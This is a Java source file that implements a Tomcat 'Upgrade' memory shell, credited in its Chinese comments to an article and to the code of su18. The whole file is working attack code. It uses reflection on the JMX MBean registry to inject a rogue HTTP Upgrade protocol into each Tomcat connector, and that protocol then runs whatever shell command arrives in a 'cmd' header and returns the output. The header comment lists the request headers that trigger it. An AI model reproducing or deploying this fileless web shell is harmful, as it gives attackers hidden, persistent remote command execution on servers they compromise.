package com.summersec.x;

import com.sun.jmx.mbeanserver.NamedObject;
import com.sun.jmx.mbeanserver.Repository;
import org.apache.catalina.connector.Connector;
import org.apache.coyote.*;
import org.apache.coyote.http11.AbstractHttp11Protocol;
import org.apache.coyote.http11.upgrade.InternalHttpUpgradeHandler;
import org.apache.tomcat.util.modeler.Registry;
import org.apache.tomcat.util.net.SocketWrapperBase;

import javax.management.DynamicMBean;
import javax.management.MBeanServer;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.lang.reflect.Field;
import java.nio.ByteBuffer;
import java.util.HashMap;

/**
 * Tomcat Upgrade 内存马
 * 文章Sndav https://mp.weixin.qq.com/s/RuP8cfjUXnLVJezBBBqsYw
 * 代码su18(修改)
 * 利用方式：增加如下header
 * Upgrade: alter
 * Connection: Upgrade
 * cmd: whoami
/*
测试依赖
     <dependency>
        <groupId>org.apache.tomcat</groupId>
        <artifactId>tomcat-catalina</artifactId>
        <version>9.0.58</version>
    </dependency>*/
public class UpgradeMemshell implements UpgradeProtocol {
    public HttpServletRequest request = null;
    public HttpServletResponse response = null;
    public String cs = "UTF-8";
    public boolean equals(Object obj) {
        this.parseObj(obj);
        StringBuffer output = new StringBuffer();
        String tag_s = "->|";
        String tag_e = "|<-";

        try {
            this.response.setContentType("text/html");
            this.request.setCharacterEncoding(this.cs);
            this.response.setCharacterEncoding(this.cs);
            output.append(this.addUpgrade());
        } catch (Exception var7) {
            output.append("ERROR:// " + var7.toString());
        }

        try {
            this.response.getWriter().print(tag_s + output.toString() + tag_e);
            this.response.getWriter().flush();
            this.response.getWriter().close();
        } catch (Exception var6) {
        }

        return true;
    }
    public void parseObj(Object obj) {
        if (obj.getClass().isArray()) {
            Object[] data = (Object[])((Object[])obj);
            this.request = (HttpServletRequest)data[0];
            this.response = (HttpServletResponse)data[1];
        } else {
            try {
                Class clazz = Class.forName("javax.servlet.jsp.PageContext");
                this.request = (HttpServletRequest)clazz.getDeclaredMethod("getRequest").invoke(obj);
                this.response = (HttpServletResponse)clazz.getDeclaredMethod("getResponse").invoke(obj);
            } catch (Exception var8) {
                if (obj instanceof HttpServletRequest) {
                    this.request = (HttpServletRequest)obj;

                    try {
                        Field req = this.request.getClass().getDeclaredField("request");
                        req.setAccessible(true);
                        HttpServletRequest request2 = (HttpServletRequest)req.get(this.request);
                        Field resp = request2.getClass().getDeclaredField("response");
                        resp.setAccessible(true);
                        this.response = (HttpServletResponse)resp.get(request2);
                    } catch (Exception var7) {
                        try {
                            this.response = (HttpServletResponse)this.request.getClass().getDeclaredMethod("getResponse").invoke(obj);
                        } catch (Exception var6) {
                        }
                    }
                }
            }
        }

    }

    public String addUpgrade() {
        try {
            String upgradeProtocol = "alter";
            //MBeanServer：MBean生存在一个MBeanServer中。MBeanServer管理这些MBean，并且代理外界对它们的访问。并且MBeanServer提供了一种注册机制，是的外界可以通过名字来得到相应的MBean实例。
            MBeanServer mbeanServer = Registry.getRegistry(null, null).getMBeanServer();
            Field field = Class.forName("com.sun.jmx.mbeanserver.JmxMBeanServer").getDeclaredField("mbsInterceptor");
            field.setAccessible(true);
            Object obj = field.get(mbeanServer);

            field = Class.forName("com.sun.jmx.interceptor.DefaultMBeanServerInterceptor").getDeclaredField("repository");
            field.setAccessible(true);
            Repository repository = (Repository) field.get(obj);

            Field field1 = repository.getClass().getDeclaredField("domainTb");
            field1.setAccessible(true);

            HashMap<String,HashMap> map         = (HashMap) field1.get(repository);
//            HashMap catalinaMap = map.get("Catalina");
            for(HashMap catalinaMap:map.values()) {
                for (int i = 0; i < catalinaMap.keySet().size(); i++) {
                    Object key = catalinaMap.keySet().toArray()[i];
                    if (key.toString().contains("type=Connector")) {
                        NamedObject namedObject = (NamedObject) catalinaMap.get(key);
                        DynamicMBean dynamicMBean = namedObject.getObject();

                        Field field2 = Class.forName("org.apache.tomcat.util.modeler.BaseModelMBean").getDeclaredField("resource");
                        field2.setAccessible(true);
                        Connector connector = (Connector) field2.get(dynamicMBean);

                        Field protocolHandlerField = Connector.class.getDeclaredField("protocolHandler");
                        protocolHandlerField.setAccessible(true);
                        AbstractHttp11Protocol handler = (AbstractHttp11Protocol) protocolHandlerField.get(connector);

                        Field upgradeProtocolsField = AbstractHttp11Protocol.class.getDeclaredField("httpUpgradeProtocols");
                        upgradeProtocolsField.setAccessible(true);
                        HashMap<String, UpgradeProtocol> upgradeProtocols = (HashMap<String, UpgradeProtocol>) upgradeProtocolsField.get(handler);

                        upgradeProtocols.put(upgradeProtocol, new UpgradeMemshell());
                        upgradeProtocolsField.set(handler, upgradeProtocols);
                        break;
                    }
                }
            }
        } catch (Exception ignored) {
            return ignored.getMessage();
        }
        return "Success";
    }

    @Override
    public String getHttpUpgradeName(boolean b) {
        return null;
    }

    @Override
    public byte[] getAlpnIdentifier() {
        return new byte[0];
    }

    @Override
    public String getAlpnName() {
        return null;
    }

    @Override
    public Processor getProcessor(SocketWrapperBase<?> socketWrapperBase, Adapter adapter) {
        return null;
    }

    @Override
    public InternalHttpUpgradeHandler getInternalUpgradeHandler(SocketWrapperBase<?> socketWrapperBase, Adapter adapter, Request request) {
        return null;
    }



//    @Override
//    public InternalHttpUpgradeHandler getInternalUpgradeHandler(Adapter adapter, Request request) {
//        return null;
//    }

    @Override
    public boolean accept(Request request) {
        System.out.println("MyUpgrade.accept");
        String p = request.getHeader("cmd");
        try {
            String[] cmd = System.getProperty("os.name").toLowerCase().contains("windows") ? new String[]{"cmd.exe", "/c", p} : new String[]{"/bin/sh", "-c", p};
            Field response = Request.class.getDeclaredField("response");
            response.setAccessible(true);
            Response resp = (Response) response.get(request);
            byte[] result = new java.util.Scanner(new ProcessBuilder(cmd).start().getInputStream()).useDelimiter("\\A").next().getBytes();
            resp.doWrite(ByteBuffer.wrap(result));
        } catch (Exception e){}
        return false;
    }
}
